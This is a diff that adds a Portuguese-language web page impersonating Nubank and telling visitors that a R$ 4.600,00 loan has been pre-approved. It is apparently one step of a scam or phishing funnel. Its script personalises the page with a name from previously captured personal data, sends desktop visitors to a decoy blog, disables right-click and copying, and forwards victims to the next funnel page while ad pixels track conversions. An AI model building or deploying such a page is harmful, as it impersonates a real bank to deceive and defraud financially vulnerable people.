@@ -1,0 +1,694 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5HHS3G78');</script>
+<!-- End Google Tag Manager -->
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nubank - Análise de Limite</title>
+  <style>
+    :root {
+      --primary: #9903d6;
+      --primary-light: #b347e8;
+      --primary-dark: #7a02a8;
+      --bg: #f8f9fa;
+      --card: #fff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --success: #16a34a;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --radius: 16px;
+      --shadow: 0 4px 20px rgba(153, 3, 214, 0.08);
+      --shadow-lg: 0 8px 32px rgba(153, 3, 214, 0.12);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+      user-select: none;
+    }
+
+    /* Header */
+    .header {
+      background: var(--primary);
+      padding: 16px 20px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 1000;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 20px rgba(153, 3, 214, 0.2);
+    }
+
+    .logo {
+      height: 32px;
+      width: auto;
+    }
+
+    .step-indicator {
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    /* Main Container */
+    .main-container {
+      padding-top: 80px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      flex: 1;
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+      width: 100%;
+    }
+
+    /* Analysis Card */
+    .analysis-card {
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-lg);
+      padding: 32px 24px;
+      margin-bottom: 24px;
+      border: 1px solid rgba(153, 3, 214, 0.08);
+      animation: slideUp 0.6s ease-out;
+      text-align: center;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .analysis-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      color: white;
+      font-size: 32px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .analysis-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 16px;
+    }
+
+    .analysis-message {
+      color: var(--text-light);
+      font-size: 1rem;
+      line-height: 1.6;
+      margin-bottom: 32px;
+    }
+
+    .analysis-message strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    /* Limit Display */
+    .limit-display {
+      background: linear-gradient(135deg, #f8fffe, #f0fdf4);
+      border: 2px solid rgba(22, 163, 74, 0.2);
+      border-radius: 16px;
+      padding: 24px;
+      margin: 24px 0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .limit-display::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(22, 163, 74, 0.1), transparent);
+      animation: shimmer 2s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    .limit-label {
+      font-size: 14px;
+      color: var(--text-light);
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    .limit-value {
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: var(--success);
+      font-family: 'Montserrat', sans-serif;
+      margin-bottom: 16px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .limit-value.hidden {
+      color: var(--text-light);
+      font-size: 2rem;
+    }
+
+    .reveal-button {
+      background: rgba(22, 163, 74, 0.1);
+      border: 2px solid var(--success);
+      color: var(--success);
+      padding: 12px 24px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      justify-content: center;
+      margin: 0 auto;
+    }
+
+    .reveal-button:hover {
+      background: var(--success);
+      color: white;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3);
+    }
+
+    .reveal-button svg {
+      width: 16px;
+      height: 16px;
+      transition: transform 0.3s ease;
+    }
+
+    .reveal-button:hover svg {
+      transform: scale(1.1);
+    }
+
+    /* Action Button */
+    .action-button {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      margin-top: 24px;
+    }
+
+    .action-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .action-button:hover::before {
+      left: 100%;
+    }
+
+    .action-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(153, 3, 214, 0.3);
+    }
+
+    .action-button:active {
+      transform: translateY(0);
+    }
+
+    .action-button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Loading State */
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid transparent;
+      border-top: 2px solid currentColor;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Benefits Section */
+    .benefits {
+      display: grid;
+      gap: 12px;
+      margin: 24px 0;
+    }
+
+    .benefit-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 16px;
+      background: #f8fffe;
+      border: 1px solid rgba(22, 163, 74, 0.2);
+      border-radius: 12px;
+      transition: all 0.2s ease;
+    }
+
+    .benefit-item:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(22, 163, 74, 0.1);
+    }
+
+    .benefit-icon {
+      width: 24px;
+      height: 24px;
+      color: var(--success);
+      flex-shrink: 0;
+    }
+
+    .benefit-text {
+      font-size: 0.9rem;
+      color: var(--text);
+      font-weight: 500;
+    }
+
+    /* Footer */
+    .footer {
+      background: var(--primary);
+      color: white;
+      padding: 40px 20px;
+      text-align: center;
+      margin-top: auto;
+    }
+
+    .footer-logo {
+      width: 60px;
+      height: auto;
+      margin-bottom: 20px;
+      opacity: 0.9;
+    }
+
+    .footer-text {
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.8);
+      line-height: 1.5;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    /* Mobile Optimizations */
+    @media (max-width: 480px) {
+      .container {
+        padding: 16px;
+      }
+      
+      .analysis-card {
+        padding: 24px 20px;
+        margin-bottom: 20px;
+      }
+      
+      .analysis-title {
+        font-size: 1.3rem;
+      }
+      
+      .limit-value {
+        font-size: 2rem;
+      }
+      
+      .action-button {
+        padding: 16px;
+        font-size: 1rem;
+      }
+    }
+
+    /* Accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+
+    /* Focus States */
+    .action-button:focus,
+    .reveal-button:focus {
+      outline: 2px solid var(--primary);
+      outline-offset: 2px;
+    }
+
+    /* High Contrast Mode */
+    @media (prefers-contrast: high) {
+      :root {
+        --primary: #7a02a8;
+        --text: #000;
+        --text-light: #333;
+      }
+    }
+
+    /* Success Animation */
+    .success-reveal {
+      animation: successPulse 0.6s ease-out;
+    }
+
+    @keyframes successPulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <img src="images/crefisa.png" alt="Nubank" class="logo">
+    <div class="step-indicator">Análise Concluída</div>
+  </header>
+
+  <!-- Main Container -->
+  <div class="main-container">
+    <div class="container">
+      <!-- Analysis Card -->
+      <div class="analysis-card">
+        <div class="analysis-icon">
+          <svg viewBox="0 0 24 24" fill="currentColor" width="32" height="32">
+            <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+          </svg>
+        </div>
+
+        <h1 class="analysis-title">Análise Aprovada!</h1>
+        
+        <div class="analysis-message" id="mensagem-analise">
+          <strong>Parabéns!</strong> Com base no seu perfil, preparamos uma oferta especial para você. Sabemos que imprevistos podem acontecer e estamos aqui para ajudar. Estamos oferecendo condições facilitadas para que você possa superar esse momento e reestabelecer sua vida financeira. Aproveite essa chance de reconstruir seu futuro!
+        </div>
+
+        <!-- Benefits -->
+        <div class="benefits">
+          <div class="benefit-item">
+            <svg class="benefit-icon" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+            </svg>
+            <div class="benefit-text">
+              <strong>Aprovação Instantânea</strong> - Sem burocracia
+            </div>
+          </div>
+
+          <div class="benefit-item">
+            <svg class="benefit-icon" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M12 2L3 7v6c0 5 4 9 9 9s9-4 9-9V7l-9-5z"></path>
+            </svg>
+            <div class="benefit-text">
+              <strong>Taxa Especial</strong> - Condições exclusivas
+            </div>
+          </div>
+
+          <div class="benefit-item">
+            <svg class="benefit-icon" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+            </svg>
+            <div class="benefit-text">
+              <strong>Liberação Rápida</strong> - Dinheiro na conta em minutos
+            </div>
+          </div>
+        </div>
+
+        <!-- Limit Display -->
+        <div class="limit-display">
+          <div class="limit-label">Valor pré-aprovado para você:</div>
+          <div class="limit-value hidden" id="mostraValor">R$ ****</div>
+          <button class="reveal-button" id="reveal-btn" onclick="verLimite()">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+              <path d="M12 9a3 3 0 0 1 3 3a3 3 0 0 1-3 3a3 3 0 0 1-3-3a3 3 0 0 1 3-3m0-4.5c5 0 9.27 3.11 11 7.5c-1.73 4.39-6 7.5-11 7.5S2.73 16.39 1 12c1.73-4.39 6-7.5 11-7.5M3.18 12a9.821 9.821 0 0 0 17.64 0a9.821 9.821 0 0 0-17.64 0"></path>
+            </svg>
+            Revelar Valor
+          </button>
+        </div>
+
+        <div class="analysis-message">
+          Deseja prosseguir com a solicitação do empréstimo com essas condições especiais?
+        </div>
+
+        <button class="action-button" id="action-btn" onclick="redirectToDrop()">
+          <span class="btn-text">Sim, Quero Prosseguir!</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <img src="images/logo.png" alt="Logo" class="footer-logo">
+      <div class="footer-text">
+        <p>© 2025 Nu Pagamentos S.A - Instituição de Pagamento.</p>
+        <p>18.236.120/0001-58 - São Paulo, SP - 05409-000</p>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    // Initialize page
+    document.addEventListener('DOMContentLoaded', function() {
+      // Desktop redirect
+      if (window.innerWidth >= 1024) {
+        window.location.href = "https://atendimentoonline.store/blog/";
+        return;
+      }
+
+      // Security measures
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && (e.key === 'c' || e.key === 'v')) {
+          e.preventDefault();
+        }
+      });
+
+      // Load user data and personalize message
+      loadUserData();
+    });
+
+    // Load user data from localStorage
+    function loadUserData() {
+      const dadosUsuario = localStorage.getItem('dadosUsuarioUni');
+      if (dadosUsuario) {
+        try {
+          const dados = JSON.parse(dadosUsuario);
+          const primeiroNome = dados.nome.split(' ')[0];
+          
+          // Personalize message
+          const mensagemPersonalizada = `
+            <strong>${primeiroNome}</strong>, analisamos suas informações e identificamos que você possui um excelente perfil creditício. Com base no seu histórico, conseguimos <strong>pré-aprovar</strong> um empréstimo especial com condições exclusivas para você.
+          `;
+          
+          document.getElementById('mensagem-analise').innerHTML = mensagemPersonalizada;
+        } catch (error) {
+          console.log('Erro ao carregar dados do usuário:', error);
+        }
+      }
+    }
+
+    // Reveal limit function
+    function verLimite() {
+      const limitValue = document.getElementById('mostraValor');
+      const revealBtn = document.getElementById('reveal-btn');
+      const limitDisplay = document.querySelector('.limit-display');
+      
+      // Add loading state
+      revealBtn.innerHTML = '<div class="spinner"></div>Revelando...';
+      revealBtn.disabled = true;
+      
+      setTimeout(() => {
+        // Reveal the value
+        limitValue.textContent = "R$ 4.600,00";
+        limitValue.classList.remove('hidden');
+        limitDisplay.classList.add('success-reveal');
+        
+        // Hide reveal button
+        revealBtn.style.display = 'none';
+        
+        // Play success sound if available
+        try {
+          const audio = new Audio('media/dinheiro.mp3');
+          audio.play().catch(() => {});
+        } catch (e) {}
+        
+        // Show success message
+        setTimeout(() => {
+          const successMsg = document.createElement('div');
+          successMsg.style.cssText = `
+            background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+            border: 2px solid var(--success);
+            color: #166534;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            margin: 16px 0;
+            animation: slideUp 0.4s ease-out;
+          `;
+          successMsg.innerHTML = '🎉 Valor revelado! Condições especiais aplicadas.';
+          limitDisplay.appendChild(successMsg);
+        }, 500);
+      }, 1500);
+    }
+
+    // Redirect function
+    function redirectToDrop() {
+      const actionBtn = document.getElementById('action-btn');
+      
+      // Add loading state
+      actionBtn.innerHTML = '<div class="spinner"></div>Processando...';
+      actionBtn.disabled = true;
+      
+      // Capture UTM parameters
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParams = urlParams.toString();
+      
+      // Build redirect URL
+      let redirectUrl = '../9/';
+      if (utmParams) {
+        redirectUrl += '?' + utmParams;
+      }
+      
+      // Simulate processing time
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 1000);
+    }
+
+    // Enhanced mobile experience
+    if (window.innerWidth <= 768) {
+      // Auto-scroll to content after animation
+      setTimeout(() => {
+        document.querySelector('.analysis-card').scrollIntoView({ 
+          behavior: 'smooth', 
+          block: 'center' 
+        });
+      }, 800);
+    }
+
+    // Track user engagement
+    let engagementTime = 0;
+    const engagementInterval = setInterval(() => {
+      engagementTime += 1;
+      if (engagementTime >= 10) { // 10 seconds
+        // User is engaged, can trigger additional actions
+        clearInterval(engagementInterval);
+      }
+    }, 1000);
+
+    // Handle page visibility changes
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        clearInterval(engagementInterval);
+      }
+    });
+  </script>
+<!-- Pixel Meta + UTMify com deduplicação -->
+<script>
+  // Gera um eventID único para deduplicação
+  const eventId = 'page-' + Date.now();
+
+  // --- Meta Pixel ---
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+  
+  fbq('init', '1607974976562499');
+  fbq('track', 'PageView', {}, {eventID: eventId});
+
+  // --- UTMify Pixel ---
+  window.pixelId = "684c7d3bb21e8e0cccb36251";
+  window.eventID = eventId; // mesmo ID para deduplicação
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1607974976562499&ev=PageView&noscript=1"/>
+</noscript>
+<!-- Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+</body></html>
